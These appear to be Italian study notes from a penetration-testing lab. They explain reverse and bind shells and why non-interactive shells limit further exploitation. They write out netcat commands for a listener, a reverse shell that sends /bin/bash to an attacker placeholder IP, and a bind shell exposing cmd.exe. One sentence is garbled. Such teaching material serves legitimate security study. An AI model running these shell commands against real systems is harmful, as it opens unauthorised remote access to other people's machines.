

Quando si tratta di sfruttare un bersaglio, siamo interessati a **due** tipi di **shell**: le **reverse shell** e le **bind shell**

- **Reverse shell** é quella shell che stabilisce una connessione DAL pc target AL pc attaccante. Questo serve per bipassare il firewall.  Tuttavia, lo svantaggio è che, quando ricevi una shell da una macchina attraverso Internet, dovresti configurare la tua rete per accettare la shell.
- **Binding shell** è quando si stabilisce una connessione DAL pc attaccante AL pc Target. In questo caso è piu facile essere rilevati da un antivirus ma non c’è bisogno di una configurazione internet.

# Shell inversa

Cominciamo con la shell inversa più comune.

Ci mettiamo in ascolto Dal pc Attaccante con 

- **sudo nc -lvnp 443**

Mentre apriamo una connessione Nella macchina bersaglio

- **nc <LOCAL-IP> <PORT> -e /bin/bash**

# Bind Shell

Le Bind shell sono meno comuni, ma comunque molto utili.

Sul bersaglio:

- **`nc -lvnp <port> -e "cmd.exe"`**

Sulla macchina attaccante:

- **`nc MACHINE_IP <port>`**

# Le shell possono essere *interattive* o *non interattive* .

- *Interattivo:*
    
    se hai utilizzato Powershell, Bash, Zsh, sh o qualsiasi altro ambiente CLI standard , allora sarai abituato alle shell interattive. Queste ti consentono di interagire con i programmi dopo averli eseguiti. Ad esempio, prendi il prompt di accesso SSH

![image](https://github.com/user-attachments/assets/00c4d7b6-ee2a-4702-80b3-7693467b8da0)

: qui puoi vedere che chiede che l'utente digiti sì o no per continuare la connessione. Questo è un programma interattivo, che richiede una shell interattiva per essere eseguito.

- *Non interattive*

  Le shell non interattive non ti danno questo lusso. In una shell non interattiva sei limitato all'uso di programmi che non richiedono l'interazione dell'utente per funzionare correttamente. Sfortunatamente, la maggior parte delle shell reverse e bind semplici non sono interattive, il che può rendere più complicato un ulteriore sfruttamento. Vediamo cosa succede quando proviamo a eseguire SSH in una shell non interattiva:

![image](https://github.com/user-attachments/assets/76b5c6e3-bae6-41f8-9a33-c17efc1cce05)

nota che il comando (che non è interattivo) viene eseguito perfettamente, ma il comando (che interattivo) non ci fornisce alcun output. Come nota a margine interessante, l'output di un comando interattivo da qualche parte, tuttavia, capire è un esercizio che puoi provare da solo. Basti dire che i programmi interattivi non funzionano nelle shell non interattive.

Inoltre, in vari punti di questo task vedrai un comando negli screenshot chiamato **`listener`**. Questo comando è un alias univoco per la macchina attaccante utilizzata per le dimostrazioni, ed è un modo abbreviato per digitare **`sudo rlwrap nc -lvnp 443`**, che sarà trattato nei task successivi. Non funzionerà *su* nessun'altra macchina a meno che l'alias non sia stato configurato localmente.



  
